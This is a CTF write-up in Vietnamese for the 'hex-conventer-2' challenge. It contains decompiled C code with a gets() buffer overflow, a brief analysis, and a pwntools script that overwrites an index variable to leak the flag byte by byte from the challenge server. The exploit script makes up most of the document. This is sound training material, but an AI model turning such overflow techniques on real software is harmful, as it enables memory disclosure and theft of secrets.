# hex-conventer-2
## Source code
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  char s[64]; // [rsp+0h] [rbp-60h] BYREF
  char v6[28]; // [rsp+40h] [rbp-20h] BYREF
  int v7; // [rsp+5Ch] [rbp-4h]

  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v7 = 0;
  puts("input text to convert to hex: ");
  gets(v6);
  v3 = fopen("flag.txt", "r");
  fgets(s, 64, v3);
  while ( 1 )
  {
    printf("%02X", (unsigned __int8)v6[v7]);
    if ( v7 <= 0 )
      break;
    --v7;
  }
  putchar(10);
  return 0;
}
```
## Phân tích
- Source khá giống bài `hex-conventer-1`, tuy nhiên chương trình đã kiểm tra giá trị biến `v7`
- Tuy nhiên lỗi ở đây là nó thực hiện `printf` trước và sau đó mới kiểm tra, như vậy giống bài trước nhưng ta sẽ cần `remote` vào netcat lấy từng byte
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/2f73f1a6-1abc-4732-90c1-ba3932f75035)

## Script
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x00000000004011fb

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('amt.rs', 31631)
else:
        p = process(exe.path)

# GDB()
flag = ""
for i in range(0x40, 1, -1):
        p = remote('amt.rs', 31631)
        # p = process(exe.path)
        
        payload = b"a" * 28 + p32(0xffffffff-i+1)

        sla(b"hex:", payload)
        p.recvline()
        flag += p.recvline(keepends=False).decode()
        info("flag " + flag)


p.interactive()
```